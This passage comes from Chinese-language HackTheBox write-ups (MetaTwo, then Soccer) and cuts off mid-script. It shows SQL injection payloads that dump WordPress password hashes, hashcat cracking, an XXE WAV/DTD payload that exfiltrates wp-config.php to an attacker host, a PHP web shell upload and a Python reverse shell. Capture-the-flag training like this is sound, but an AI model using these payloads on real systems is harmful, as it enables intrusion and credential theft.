class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(table_name) from information_schema.tables where table_schema=0x626c6f67-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>blog库表名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">wp_options</span><br><span class="line">wp_term_taxonomy</span><br><span class="line">wp_bookingpress_servicesmeta</span><br><span class="line">wp_commentmeta</span><br><span class="line">wp_users</span><br><span class="line">wp_bookingpress_customers_meta</span><br><span class="line">wp_bookingpress_settings</span><br><span class="line">wp_bookingpress_appointment_bookings</span><br><span class="line">wp_bookingpress_customize_settings</span><br><span class="line">wp_bookingpress_debug_payment_log</span><br><span class="line">wp_bookingpress_services</span><br><span class="line">wp_termmeta</span><br><span class="line">wp_links</span><br><span class="line">wp_bookingpress_entries</span><br><span class="line">wp_bookingpress_categories</span><br><span class="line">wp_bookingpress_customers</span><br><span class="line">wp_bookingpress_notifications</span><br><span class="line">wp_usermeta</span><br><span class="line">wp_terms</span><br><span class="line">wp_bookingpress_default_daysoff</span><br><span class="line">wp_comments</span><br><span class="line">wp_bookingpress_default_workhours</span><br><span class="line">wp_postmeta</span><br><span class="line">wp_bookingpress_form_fields</span><br><span class="line">wp_bookingpress_payment_logs</span><br><span class="line">wp_posts</span><br><span class="line">wp_term_relationships</span><br></pre></td></tr></table></figure><p>查列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,5,group_concat(column_name) from information_schema.columns where table_schema=0x626c6f67 and table_name=0x77705f7573657273-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>blog库wp_users表列名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ID</span><br><span class="line">user_login</span><br><span class="line">user_pass</span><br><span class="line">user_nicename</span><br><span class="line">user_email</span><br><span class="line">user_url</span><br><span class="line">user_registered</span><br><span class="line">user_activation_key</span><br><span class="line">user_status</span><br><span class="line">display_name</span><br></pre></td></tr></table></figure><p>查账户信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i <span class="string">&#x27;http://metapress.htb/wp-admin/admin-ajax.php&#x27;</span> --data <span class="string">&#x27;action=bookingpress_front_get_category_services&amp;_wpnonce=7ea553b73c&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT -2,-1,0,1,2,3,4,group_concat(user_login),group_concat(user_pass) from blog.wp_users-- -&#x27;</span></span><br></pre></td></tr></table></figure><p>用户名与密码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin:$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.</span><br><span class="line">manager:$P$B4aNM28N0E.tMy&#x2F;JIcnVMZbGcU16Q70</span><br></pre></td></tr></table></figure><p><strong>读出来的json里面，<code>&quot;/&quot;</code>会被转义为<code>&quot;\/&quot;</code></strong></p><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.\n$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70&#x27;</span> &gt; <span class="built_in">hash</span></span><br><span class="line">hashcat -m 400 ./<span class="built_in">hash</span> /usr/share/wordlist/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到manager的账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager:partylikearockstar</span><br></pre></td></tr></table></figure><p>根据之前wpscan的结果，可以找到wordpress 5.6.2 XXE漏洞</p><blockquote><p><a href="https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</a><br /><a href="https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/">https://www.sonarsource.com/blog/wordpress-xxe-security-vulnerability/</a><br /><a href="https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</a></p></blockquote><p>这个漏洞需要认证，即用户登陆状态才能出发</p><p>构造wav文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -en <span class="string">&#x27;RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;http://10.10.*.*/xxe.dtd&#x27;</span><span class="string">&quot;&#x27;&quot;</span><span class="string">&#x27;&gt;%remote;%param1;%exfil;] &gt;\x00&#x27;</span>&gt; malicious.wav</span><br></pre></td></tr></table></figure><p>构造xxe.dtd文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;..&#x2F;wp-config.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY &amp;#37; exfil SYSTEM &#39;http:&#x2F;&#x2F;10.10.*.*&#x2F;?%data;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>媒体库中上传wav文件即可出发XXE漏洞</p><p>得到FTP账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">metapress.htb:9NYS_ii@FyL_p5M2NvJ</span><br></pre></td></tr></table></figure><p>登录FTP并获取文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ftp 10.10.11.186</span><br><span class="line">metapress.htb</span><br><span class="line">9NYS_ii@FyL_p5M2NvJ</span><br><span class="line"><span class="built_in">cd</span> mailer</span><br><span class="line">get send_email.php</span><br></pre></td></tr></table></figure><p>得到以下账户信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jnelson@metapress.htb:Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure><p>尝试用于登录SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh jnelson@10.10.11.186</span><br><span class="line">Cb4_JmWM8zUZWMu@Ys</span><br></pre></td></tr></table></figure><p>登陆成功</p><p>获取user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/user.txt </span><br><span class="line">1d67d6f8d41d206a8fb29e4570a4b6e2</span><br></pre></td></tr></table></figure><h2 id="权限提升-20"><a class="markdownIt-Anchor" href="#权限提升-20"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/jnelson/password </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">credentials:</span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: root@ssh</span><br><span class="line">  login: root</span><br><span class="line">  modified: 2022-06-26 08:58:15.621572</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;p7qfAZt4_A1xo_0x&#x27;</span></span><br><span class="line">- comment: <span class="string">&#x27;&#x27;</span></span><br><span class="line">  fullname: jnelson@ssh</span><br><span class="line">  login: jnelson</span><br><span class="line">  modified: 2022-06-26 08:58:15.514422</span><br><span class="line">  name: ssh</span><br><span class="line">  password: !!python/unicode <span class="string">&#x27;Cb4_JmWM8zUZWMu@Ys&#x27;</span></span><br><span class="line">handler: passpie</span><br><span class="line">version: 1.0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su root</span><br><span class="line">p7qfAZt4_A1xo_0x</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt </span><br><span class="line">686e0b48d30c2092e9ecc70f97a0086f</span><br></pre></td></tr></table></figure><hr /><p>Easiest privilege escalation ever.</p><hr /><h1 id="hackthebox_soccer"><a class="markdownIt-Anchor" href="#hackthebox_soccer"></a> HackTheBox_Soccer</h1><h2 id="信息收集-5"><a class="markdownIt-Anchor" href="#信息收集-5"></a> 信息收集</h2><h3 id="端口扫描-22"><a class="markdownIt-Anchor" href="#端口扫描-22"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.194</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.194</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http            nginx 1.18.0 (Ubuntu)</span><br><span class="line">9091&#x2F;tcp open  xmltec-xmlmail?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port9091-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;5%Time&#x3D;640459F7%P&#x3D;x86_64-pc-linux-gnu%r(inf</span><br><span class="line">SF:ormix,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\</span><br><span class="line">SF:n\r\n&quot;)%r(drda,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2</span><br><span class="line">SF:0close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\n</span><br><span class="line">SF:Content-Security-Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Opt</span><br><span class="line">SF:ions:\x20nosniff\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nCon</span><br><span class="line">SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x</span><br><span class="line">SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;</span><br><span class="line">SF:\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;h</span><br><span class="line">SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(HTT</span><br><span class="line">SF:POptions,16C,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli</span><br><span class="line">SF:cy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nC</span><br><span class="line">SF:ontent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r</span><br><span class="line">SF:\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x20GMT\r\nConnection:\</span><br><span class="line">SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;met</span><br><span class="line">SF:a\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca</span><br><span class="line">SF:nnot\x20OPTIONS\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RTSPRequest,16C,&quot;HTT</span><br><span class="line">SF:P&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr</span><br><span class="line">SF:c\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t</span><br><span class="line">SF:ext&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x</span><br><span class="line">SF:2005\x20Mar\x202023\x2008:52:26\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;</span><br><span class="line">SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;ut</span><br><span class="line">SF:f-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x</span><br><span class="line">SF:20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\</span><br><span class="line">SF:x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r</span><br><span class="line">SF:(DNSStatusRequestTCP,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnecti</span><br><span class="line">SF:on:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\</span><br><span class="line">SF:nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举-3"><a class="markdownIt-Anchor" href="#路径枚举-3"></a> 路径枚举</h3><p>请求WEB页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.194</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 05 Mar 2023 08:54:10 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;soccer.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名<code>soccer.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.194\tsoccer.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://soccer.htb/ /usr/share/wordlists/SecLists-master/Discovery/Web-Content/SVNDigger/all-dirs.txt -w</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;soccer.htb&#x2F;tiny&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p></blockquote><h2 id="漏洞利用-20"><a class="markdownIt-Anchor" href="#漏洞利用-20"></a> 漏洞利用</h2><p>访问页面<code>http://soccer.htb/tiny/</code></p><p>源代码中存在以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://tinyfilemanager.github.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span> <span class="attr">data-version</span>=<span class="string">&quot;2.4.3&quot;</span>&gt;</span>CCP Programmers<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即版本为2.4.3</p><p>相关EXP</p><blockquote><p><a href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py</a></p></blockquote><p>适当修改脚本后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">datas&#x3D;&#123;&quot;p&quot;:&quot;tiny&#x2F;uploads&quot;, &quot;fullpath&quot;:&quot;&#x2F;BFL&#x2F;BFL.php&quot;&#125;</span><br><span class="line">files&#x3D;&#123;&quot;file&quot;:(&quot;exp.php&quot;,&quot;&lt;?php system($_REQUEST[&#39;BFL&#39;]); ?&gt;&quot;,&quot;application&#x2F;x-php&quot;)&#125;</span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://soccer.htb/tiny/uploads/BFL/BFL.php?BFL=python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.16.30%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22&#x27;</span></span><br></pre></td></tr></table></figure><p>获取TTY</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>查看WEB站点配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/default.htb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line">server_name 0.0.0.0;</span><br><span class="line">return 301 http:&#x2F;&#x2F;soccer.htb$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line"></span><br><span class="line">server_name soccer.htb;</span><br><span class="line"></span><br><span class="line">root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">index index.html tinyfilemanager.php;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ &#x2F;\.ht &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/soc-player.htb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line"></span><br><span class="line">server_name soc-player.soccer.htb;</span><br><span class="line"></span><br><span class="line">root &#x2F;root&#x2F;app&#x2F;views;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;localhost:3000;</span><br><span class="line">proxy_http_version 1.1;</span><br><span class="line">proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">proxy_set_header Connection &#39;upgrade&#39;;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_cache_bypass $http_upgrade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到新域名<code>soc-player.soccer.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.194\tsoc-player.soccer.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问域名<code>soc-player.soccer.htb</code></p><p>进行注册，登录</p><p>源代码中存在以下js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;connected to the server&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">input.addEventListener(<span class="string">&#x27;keypress&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">keyOne(e)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keyOne</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">e.stopPropagation();</span><br><span class="line"><span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">e.preventDefault();</span><br><span class="line">sendText();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendText</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> msg = input.value;</span><br><span class="line"><span class="keyword">if</span> (msg.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">ws.send(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: msg</span><br><span class="line">&#125;))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> append(<span class="string">&quot;????????&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">append(e.data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="comment">// let randomColor = &#x27;#&#x27; + Math.floor(Math.random() 